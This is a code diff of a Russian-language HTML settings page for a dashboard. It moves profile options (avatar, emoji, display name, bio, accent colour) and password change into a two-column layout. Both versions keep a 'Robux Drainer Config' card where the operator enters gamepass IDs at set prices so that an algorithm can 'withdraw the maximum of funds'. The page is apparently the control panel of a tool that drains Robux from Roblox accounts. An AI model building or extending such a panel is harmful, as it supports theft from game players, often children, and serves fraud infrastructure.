@@ -14,118 +14,104 @@
       <div class="top-bar">
         <h1 class="page-title">Настройки</h1>
       </div>
-  <div class="container" style="max-width:720px; margin:0 auto; padding-top:2rem;">
-    <h2 style="font-size:1.6rem; font-weight:800; margin-bottom:1.5rem; letter-spacing:-0.03em;">Настройки профиля</h2>
-
-    <div class="settings-card" id="profilePreview" style="margin-bottom:1.5rem; background: var(--bg-raised);">
-      <div class="profile-preview-row">
-        <div class="profile-preview-avatar" id="previewAvatar">🦊</div>
-        <div>
-          <div class="profile-preview-name" id="previewName">—</div>
-          <div class="profile-preview-bio" id="previewBio">—</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="settings-card">
-      <label class="settings-label">Отображаемое имя</label>
-      <input type="text" class="settings-input" id="displayName" maxlength="32" placeholder="Как тебя видят">
-      <div class="settings-hint">Максимум 32 символа</div>
-    </div>
-
-    <div class="settings-card">
-      <label class="settings-label">Аватар (Фото или Эмодзи)</label>
+  <div class="container" style="max-width:1100px; margin:0 auto; padding-top:2rem;">
+    <div class="settings-grid">
       
-      <div class="avatar-upload-area" style="margin-bottom: 1.5rem;">
-        <div class="avatar-preview-circle" id="uploadPreviewCircle">
-          <span id="uploadPreviewPlaceholder" style="opacity: 0.3;">📷</span>
-          <img id="uploadPreviewImg" src="" style="display:none;" alt="">
+      <!-- LEFT COLUMN: Profile & Personalization -->
+      <div class="settings-col">
+        <h2 class="settings-section-title">Профиль и Персонализация</h2>
+        
+        <div class="settings-card avatar-card">
+          <div class="avatar-upload-large" id="previewAvatar" onclick="document.getElementById('avatarFileInput').click()">
+            <!-- This will be populated by JS (emoji or img) -->
+            🦊
+          </div>
+          <div class="avatar-controls">
+            <input type="file" id="avatarFileInput" accept="image/png, image/jpeg, image/webp" style="display:none;">
+            <button class="btn-secondary btn-sm" id="btnResetAvatar">Сбросить фото</button>
+          </div>
+          
+          <div class="emoji-picker-compact" id="emojiPicker">
+            <button class="emoji-btn" data-emoji="🦊">🦊</button>
+            <button class="emoji-btn" data-emoji="🐉">🐉</button>
+            <button class="emoji-btn" data-emoji="🐺">🐺</button>
+            <button class="emoji-btn" data-emoji="💀">💀</button>
+            <button class="emoji-btn" data-emoji="⚡">⚡</button>
+            <button class="emoji-btn" data-emoji="💎">💎</button>
+            <input type="text" class="settings-input premium-input emoji-custom-input" id="avatarInput" maxlength="8" placeholder="Свой эмодзи">
+          </div>
         </div>
-        <div class="avatar-upload-controls">
-          <input type="file" id="avatarFileInput" accept="image/png, image/jpeg, image/webp" style="display:none;">
-          <button class="avatar-upload-btn" onclick="document.getElementById('avatarFileInput').click()">Загрузить фотографию</button>
-          <button class="avatar-reset-btn" id="btnResetAvatar">Сбросить фото (использовать эмодзи)</button>
+
+        <div class="settings-card">
+          <label class="settings-label">Отображаемое имя</label>
+          <input type="text" class="settings-input premium-input" id="displayName" maxlength="32" placeholder="Как тебя видят">
+          
+          <label class="settings-label" style="margin-top:1.5rem;">Статус / О себе</label>
+          <input type="text" class="settings-input premium-input" id="bio" maxlength="120" placeholder="Например: Root Admin">
+          
+          <!-- Hidden preview elements to keep JS happy -->
+          <div style="display:none;">
+            <span id="previewName"></span>
+            <span id="previewBio"></span>
+            <img id="uploadPreviewImg" src="">
+            <span id="uploadPreviewPlaceholder"></span>
+          </div>
+        </div>
+
+        <div class="settings-card">
+          <label class="settings-label">Цвет акцента</label>
+          <div class="color-picker-premium" id="colorPicker">
+            <button class="color-dot" data-color="#6366f1" style="background:#6366f1;"></button>
+            <button class="color-dot" data-color="#00CEC9" style="background:#00CEC9;"></button>
+            <button class="color-dot" data-color="#ff6b6b" style="background:#ff6b6b;"></button>
+            <button class="color-dot" data-color="#51cf66" style="background:#51cf66;"></button>
+            <button class="color-dot" data-color="#ffd43b" style="background:#ffd43b;"></button>
+            <button class="color-dot" data-color="#e599f7" style="background:#e599f7;"></button>
+            <div class="custom-color-wrapper">
+              <input type="color" class="settings-color-input" id="themeColor" value="#6366f1">
+            </div>
+          </div>
         </div>
       </div>
 
-      <label class="settings-label" style="font-size: 0.65rem;">Или выберите эмодзи:</label>
-      <div class="emoji-picker" id="emojiPicker">
-        <button class="emoji-btn" data-emoji="🦊">🦊</button>
-        <button class="emoji-btn" data-emoji="🐉">🐉</button>
-        <button class="emoji-btn" data-emoji="🐺">🐺</button>
-        <button class="emoji-btn" data-emoji="🦁">🦁</button>
-        <button class="emoji-btn" data-emoji="🐯">🐯</button>
-        <button class="emoji-btn" data-emoji="🐸">🐸</button>
-        <button class="emoji-btn" data-emoji="🦅">🦅</button>
-        <button class="emoji-btn" data-emoji="🐙">🐙</button>
-        <button class="emoji-btn" data-emoji="💀">💀</button>
-        <button class="emoji-btn" data-emoji="👻">👻</button>
-        <button class="emoji-btn" data-emoji="🤖">🤖</button>
-        <button class="emoji-btn" data-emoji="👾">👾</button>
-        <button class="emoji-btn" data-emoji="🔥">🔥</button>
-        <button class="emoji-btn" data-emoji="⚡">⚡</button>
-        <button class="emoji-btn" data-emoji="💎">💎</button>
-        <button class="emoji-btn" data-emoji="🌙">🌙</button>
-        <button class="emoji-btn" data-emoji="☀️">☀️</button>
-        <button class="emoji-btn" data-emoji="⭐">⭐</button>
-        <button class="emoji-btn" data-emoji="🎯">🎯</button>
-        <button class="emoji-btn" data-emoji="🚀">🚀</button>
+      <!-- RIGHT COLUMN: Security & Modules -->
+      <div class="settings-col">
+        <h2 class="settings-section-title">Безопасность и Модули</h2>
+
+        <div class="settings-card">
+          <label class="settings-label">Смена пароля</label>
+          <input type="password" class="settings-input premium-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom:1rem;">
+          <input type="password" class="settings-input premium-input" id="newPassword" placeholder="Новый пароль">
+          <div class="settings-hint">Оставь пустым, если не хочешь менять</div>
+        </div>
+
+        <div class="settings-card drainer-card" id="drainGamepassesContainer">
+          <div class="drainer-header">
+            <span class="drainer-icon">⚙️</span>
+            <label class="settings-label" style="margin-bottom:0;">Robux Drainer Config</label>
+          </div>
+          <div class="settings-hint" style="margin-bottom: 1.5rem;">Настрой ID геймпассов для автоматического вывода средств. Алгоритм сам подберет лучшую комбинацию.</div>
+          
+          <div class="drainer-grid">
+            <div class="drainer-item"><label>10 000 R$</label><input type="text" class="settings-input gp-input" data-price="10000" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>5 000 R$</label><input type="text" class="settings-input gp-input" data-price="5000" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>1 000 R$</label><input type="text" class="settings-input gp-input" data-price="1000" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>500 R$</label><input type="text" class="settings-input gp-input" data-price="500" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>100 R$</label><input type="text" class="settings-input gp-input" data-price="100" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>50 R$</label><input type="text" class="settings-input gp-input" data-price="50" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>25 R$</label><input type="text" class="settings-input gp-input" data-price="25" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>10 R$</label><input type="text" class="settings-input gp-input" data-price="10" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>5 R$</label><input type="text" class="settings-input gp-input" data-price="5" placeholder="ID геймпасса"></div>
+            <div class="drainer-item"><label>2 R$</label><input type="text" class="settings-input gp-input" data-price="2" placeholder="ID геймпасса"></div>
+          </div>
+        </div>
+
+        <button class="btn-submit premium-btn-save" id="btnSave">
+          <span class="save-icon">💾</span> Сохранить изменения
+        </button>
       </div>
-      <input type="text" class="settings-input" id="avatarInput" maxlength="8" placeholder="Свой эмодзи" style="margin-top:0.75rem; max-width: 200px;">
+
     </div>
-
-    <div class="settings-card">
-      <label class="settings-label">Цвет акцента</label>
-      <div class="color-picker" id="colorPicker">
-        <button class="color-btn" data-color="#6366f1" style="background:#6366f1;"></button>
-        <button class="color-btn" data-color="#00CEC9" style="background:#00CEC9;"></button>
-        <button class="color-btn" data-color="#ff6b6b" style="background:#ff6b6b;"></button>
-        <button class="color-btn" data-color="#51cf66" style="background:#51cf66;"></button>
-        <button class="color-btn" data-color="#ffd43b" style="background:#ffd43b;"></button>
-        <button class="color-btn" data-color="#ff922b" style="background:#ff922b;"></button>
-        <button class="color-btn" data-color="#f783ac" style="background:#f783ac;"></button>
-        <button class="color-btn" data-color="#e599f7" style="background:#e599f7;"></button>
-        <button class="color-btn" data-color="#74c0fc" style="background:#74c0fc;"></button>
-        <button class="color-btn" data-color="#20c997" style="background:#20c997;"></button>
-      </div>
-      <div style="display: flex; align-items: center; gap: 0.75rem; margin-top: 0.5rem;">
-        <input type="color" class="settings-color-input" id="themeColor" value="#6366f1">
-        <span class="settings-hint" style="margin-top: 0;">Свой цвет (меняет оформление всего дашборда)</span>
-      </div>
-    </div>
-
-    <div class="settings-card">
-      <label class="settings-label">Статус / О себе</label>
-      <input type="text" class="settings-input" id="bio" maxlength="120" placeholder="Например: Root Admin">
-      <div class="settings-hint">Показывается в шапке профиля (макс. 120 символов)</div>
-    </div>
-
-    <div class="settings-card">
-      <label class="settings-label">Смена пароля</label>
-      <input type="password" class="settings-input" id="currentPassword" placeholder="Текущий пароль" style="margin-bottom:0.75rem;">
-      <input type="password" class="settings-input" id="newPassword" placeholder="Новый пароль">
-      <div class="settings-hint">Оставь пустым, если не хочешь менять</div>
-    </div>
-
-    <div class="settings-card" id="drainGamepassesContainer">
-      <label class="settings-label">ID геймпассов (Robux Drainer)</label>
-      <div class="settings-hint" style="margin-bottom: 1rem;">Создайте геймпассы с указанными ценами и вставьте их ID в соответствующие поля. Алгоритм скомбинирует их для вывода максимума средств!</div>
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem;">
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">10 000 R$</label><input type="text" class="settings-input gp-input" data-price="10000" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">5 000 R$</label><input type="text" class="settings-input gp-input" data-price="5000" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">1 000 R$</label><input type="text" class="settings-input gp-input" data-price="1000" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">500 R$</label><input type="text" class="settings-input gp-input" data-price="500" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">100 R$</label><input type="text" class="settings-input gp-input" data-price="100" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">50 R$</label><input type="text" class="settings-input gp-input" data-price="50" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">25 R$</label><input type="text" class="settings-input gp-input" data-price="25" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">10 R$</label><input type="text" class="settings-input gp-input" data-price="10" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">5 R$</label><input type="text" class="settings-input gp-input" data-price="5" placeholder="ID геймпасса"></div>
-        <div><label class="settings-hint" style="margin-bottom:4px; display:block; color:#10b981; font-weight:600;">2 R$</label><input type="text" class="settings-input gp-input" data-price="2" placeholder="ID геймпасса"></div>
-      </div>
-    </div>
-
-    <button class="btn-submit" id="btnSave" style="max-width:100%; margin-top: 1rem; margin-bottom:3rem;">Сохранить настройки</button>
-
   </div>
   </main>
   </div> <!-- end of sidebar-layout -->
